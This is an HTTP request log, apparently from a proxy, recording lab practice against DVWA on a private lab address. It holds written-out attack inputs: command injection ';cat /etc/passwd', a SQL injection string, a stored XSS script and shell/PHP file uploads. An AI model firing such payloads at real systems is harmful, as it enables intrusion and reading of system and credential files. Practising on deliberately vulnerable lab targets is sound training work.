2025-12-22T09:42:24.967079Z,"('127.0.0.1', 45174)",POST,http://192.168.122.170/dvwa/login.php,/dvwa/login.php,username=msfadmin&password=pass&Login=Login,43,3.926,2,2,0,0,302,0
2025-12-22T09:42:25.034478Z,"('127.0.0.1', 45174)",GET,http://192.168.122.170/dvwa/login.php,/dvwa/login.php,,0,0.0,0,2,0,0,200,1328
2025-12-22T09:44:33.755160Z,"('127.0.0.1', 54392)",POST,http://192.168.122.170/dvwa/login.php,/dvwa/login.php,username=admin&password=password&Login=Login,44,3.9,2,2,0,0,302,0
2025-12-22T09:44:33.794163Z,"('127.0.0.1', 54392)",GET,http://192.168.122.170/dvwa/index.php,/dvwa/index.php,,0,0.0,0,2,0,0,200,4585
2025-12-22T09:44:33.936445Z,"('127.0.0.1', 54392)",GET,http://192.168.122.170/dvwa/dvwa/css/main.css,/dvwa/dvwa/css/main.css,,0,0.0,0,4,0,0,304,0
2025-12-22T09:44:33.982571Z,"('127.0.0.1', 54402)",GET,http://192.168.122.170/dvwa/dvwa/js/dvwaPage.js,/dvwa/dvwa/js/dvwaPage.js,,0,0.0,0,4,0,0,304,0
2025-12-22T09:44:33.998569Z,"('127.0.0.1', 54414)",GET,http://192.168.122.170/dvwa/dvwa/images/logo.png,/dvwa/dvwa/images/logo.png,,0,0.0,0,4,0,0,304,0
2025-12-22T09:46:35.290810Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/instructions.php,/dvwa/instructions.php,,0,0.0,0,2,0,0,200,9760
2025-12-22T09:46:36.362856Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/setup.php,/dvwa/setup.php,,0,0.0,0,2,0,0,200,3554
2025-12-22T09:46:36.641926Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/dvwa/images/spanner.png,/dvwa/dvwa/images/spanner.png,,0,0.0,0,4,0,0,200,716
2025-12-22T09:46:37.715075Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/vulnerabilities/brute/,/dvwa/vulnerabilities/brute/,,0,0.0,0,4,0,0,200,4525
2025-12-22T09:46:38.915439Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/vulnerabilities/exec/,/dvwa/vulnerabilities/exec/,,0,0.0,0,4,0,0,200,4334
2025-12-22T09:46:40.046911Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/vulnerabilities/brute/,/dvwa/vulnerabilities/brute/,,0,0.0,0,4,0,0,200,4525
2025-12-22T09:46:51.203803Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/vulnerabilities/brute/?username=admin&password=pass&Login=Login,/dvwa/vulnerabilities/brute/?username=admin&password=pass&Login=Login,,0,0.0,0,4,3,0,200,4575
2025-12-22T09:46:58.132993Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/vulnerabilities/brute/?username=admin&password=&Login=Login,/dvwa/vulnerabilities/brute/?username=admin&password=&Login=Login,,0,0.0,0,4,3,0,200,4575
2025-12-22T09:46:58.996113Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/vulnerabilities/exec/,/dvwa/vulnerabilities/exec/,,0,0.0,0,4,0,0,200,4334
2025-12-22T09:47:03.354573Z,"('127.0.0.1', 37260)",POST,http://192.168.122.170/dvwa/vulnerabilities/exec/,/dvwa/vulnerabilities/exec/,ip=ls&submit=submit,19,3.221,1,4,0,0,200,4382
2025-12-22T09:47:08.943978Z,"('127.0.0.1', 37260)",POST,http://192.168.122.170/dvwa/vulnerabilities/exec/,/dvwa/vulnerabilities/exec/,ip=%3Bls&submit=submit,22,3.573,1,4,0,0,200,4382
2025-12-22T09:47:21.440721Z,"('127.0.0.1', 37260)",POST,http://192.168.122.170/dvwa/vulnerabilities/exec/,/dvwa/vulnerabilities/exec/,ip=%3Bcat+%2Fetc%2Fpasswd&submit=submit,39,4.17,1,4,0,0,200,4382
2025-12-22T09:47:23.061751Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/vulnerabilities/csrf/,/dvwa/vulnerabilities/csrf/,,0,0.0,0,4,0,0,200,4674
2025-12-22T09:47:24.239549Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=include.php,/dvwa/vulnerabilities/fi/?page=include.php,,0,0.0,0,4,1,0,200,4086
2025-12-22T09:47:26.549293Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/vulnerabilities/sqli/,/dvwa/vulnerabilities/sqli/,,0,0.0,0,4,0,0,200,4336
2025-12-22T09:47:37.968035Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/vulnerabilities/sqli/?id=%271+OR+1+--&Submit=Submit,/dvwa/vulnerabilities/sqli/?id=%271+OR+1+--&Submit=Submit,,0,0.0,0,4,2,0,200,4336
2025-12-22T09:47:39.401808Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/vulnerabilities/sqli_blind/,/dvwa/vulnerabilities/sqli_blind/,,0,0.0,0,4,0,0,200,4364
2025-12-22T09:47:40.675737Z,"('127.0.0.1', 37260)",GET,http://192.168.122.170/dvwa/vulnerabilities/upload/,/dvwa/vulnerabilities/upload/,,0,0.0,0,4,0,0,200,4519
2025-12-22T09:48:33.492942Z,"('127.0.0.1', 58054)",POST,http://192.168.122.170/dvwa/vulnerabilities/upload/,/dvwa/vulnerabilities/upload/,"-----------------------------119129377023361824472764095896
\nContent-Disposition: form-data; name=""MAX_FILE_SIZE""
\n
\n100000
\n-----------------------------119129377023361824472764095896
\nContent-Disposition: form-data; name=""uploaded""; filename=""passss.sh""
\nContent-Type: application/x-shellscript
\n
\npass\nadmin\nuser\n1234\nbee\nbug\npassssss\nlogin\npassword\nadmin\nadmin123\n
\n-----------------------------119129377023361824472764095896
\nContent-Disposition: form-data; name=""Upload""
\n
\nUpload
\n-----------------------------119129377023361824472764095896--
\n",551,4.747,13,4,0,1,200,4558
2025-12-22T09:48:39.869063Z,"('127.0.0.1', 58054)",POST,http://192.168.122.170/dvwa/vulnerabilities/upload/,/dvwa/vulnerabilities/upload/,"-----------------------------24510222733497811962417929087
\nContent-Disposition: form-data; name=""MAX_FILE_SIZE""
\n
\n100000
\n-----------------------------24510222733497811962417929087
\nContent-Disposition: form-data; name=""uploaded""; filename=""passs.php""
\nContent-Type: application/x-php
\n
\npass\nadmin\nuser\n1234\nbee\nbug\npassssss\nlogin\npassword\nadmin\nadmin123\n
\n-----------------------------24510222733497811962417929087
\nContent-Disposition: form-data; name=""Upload""
\n
\nUpload
\n-----------------------------24510222733497811962417929087--
\n",539,4.703,13,4,0,1,200,4558
2025-12-22T09:48:47.790312Z,"('127.0.0.1', 58054)",GET,http://192.168.122.170/dvwa/vulnerabilities/xss_r/,/dvwa/vulnerabilities/xss_r/,,0,0.0,0,4,0,0,200,4320
2025-12-22T09:48:55.591233Z,"('127.0.0.1', 58054)",GET,http://192.168.122.170/dvwa/vulnerabilities/xss_r/?name=kalisssss,/dvwa/vulnerabilities/xss_r/?name=kalisssss,,0,0.0,0,4,1,0,200,4346
2025-12-22T09:48:58.390580Z,"('127.0.0.1', 58054)",GET,http://192.168.122.170/dvwa/vulnerabilities/xss_s/,/dvwa/vulnerabilities/xss_s/,,0,0.0,0,4,0,0,200,4854
2025-12-22T09:49:31.729523Z,"('127.0.0.1', 47882)",POST,http://192.168.122.170/dvwa/vulnerabilities/xss_s/,/dvwa/vulnerabilities/xss_s/,txtName=hello&mtxMessage=%3Cscript%3Ealert%28%22denger%22%29%3C%2Fscript%3E&btnSign=Sign+Guestbook,98,4.729,2,4,0,0,200,5001
2025-12-22T09:49:45.677283Z,"('127.0.0.1', 47882)",GET,http://192.168.122.170/dvwa/security.php,/dvwa/security.php,,0,0.0,0,2,0,0,200,4106
2025-12-22T09:49:45.982041Z,"('127.0.0.1', 47882)",GET,http://192.168.122.170/dvwa/dvwa/images/lock.png,/dvwa/dvwa/images/lock.png,,0,0.0,0,4,0,0,200,1025
2025-12-22T09:49:48.035448Z,"('127.0.0.1', 47882)",GET,http://192.168.122.170/dvwa/phpinfo.php,/dvwa/phpinfo.php,,0,0.0,0,2,0,0,200,50784
2025-12-22T09:49:48.296135Z,"('127.0.0.1', 47882)",GET,http://192.168.122.170/dvwa/phpinfo.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42,/dvwa/phpinfo.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42,,0,0.0,0,2,1,0,200,2524
2025-12-22T09:49:48.335195Z,"('127.0.0.1', 58740)",GET,http://192.168.122.170/dvwa/phpinfo.php?=SUHO8567F54-D428-14d2-A769-00DA302A5F18,/dvwa/phpinfo.php?=SUHO8567F54-D428-14d2-A769-00DA302A5F18,,0,0.0,0,2,1,0,200,2813
2025-12-22T09:49:48.340646Z,"('127.0.0.1', 58748)",GET,http://192.168.122.170/dvwa/phpinfo.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42,/dvwa/phpinfo.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42,,0,0.0,0,2,1,0,200,2146
2025-12-22T09:49:55.469439Z,"('127.0.0.1', 47882)",GET,http://192.168.122.170/dvwa/about.php,/dvwa/about.php,,0,0.0,0,2,0,0,200,5647
2025-12-22T09:49:57.913304Z,"('127.0.0.1', 47882)",GET,http://192.168.122.170/dvwa/logout.php,/dvwa/logout.php,,0,0.0,0,2,0,0,302,0
2025-12-22T09:49:57.955256Z,"('127.0.0.1', 47882)",GET,http://192.168.122.170/dvwa/login.php,/dvwa/login.php,,0,0.0,0,2,0,0,200,1335
